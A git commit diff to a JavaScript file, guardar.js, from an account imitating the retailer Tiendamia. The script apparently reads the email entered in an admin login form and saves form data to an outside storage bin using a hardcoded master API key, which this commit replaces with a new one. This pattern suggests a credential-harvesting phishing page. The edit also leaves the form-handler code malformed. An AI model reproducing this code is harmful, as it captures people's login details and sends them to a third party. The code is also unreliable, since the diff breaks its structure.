03effb10edbca4b1d18fc9e8ac9a805a711da8d4
TiendamiaBP <158293608+TiendamiaBP@users.noreply.github.com>
2024-01-31 18:47:30 -0300

    guardar.js

--- guardar.js
+++ guardar.js
@@ -1,5 +1,5 @@
 const BIN_ID = '65ba84021f5677401f28f3cb';
-const X_MASTER_KEY = '$2a$10$AoLVRAciFNswT7KuuOMa9.DJ8CxnYnKwgdYfWVS9TvdHV3gpNAL.S';
+const X_MASTER_KEY = '$2a$10$SPnSCePVMiT4fZnmd.DVkOYXTe9wOTGzhsevMfAVMbTaXoroZSa6y';
 
 function guardarDatos(data) {
     console.log('Guardando datos:', data);
@@ -22,10 +22,10 @@ function guardarDatos(data) {
         .catch(error => console.error('Error:', error));
 }
 
-// Temporalmente comentamos la llamada a guardarDatos
-// Esta llamada se activaría cuando el formulario se envíe
-$('#login-form-admin').submit(function (event) {
-    event.preventDefault();
+// Continúa con el envío del formulario si es necesario
+// Puedes redirigir o realizar otras acciones aquí
+document.getElementById('login-form-admin').submit();
+
 
     // Recopila datos del formulario
     const email = $('#email_address_login').val();
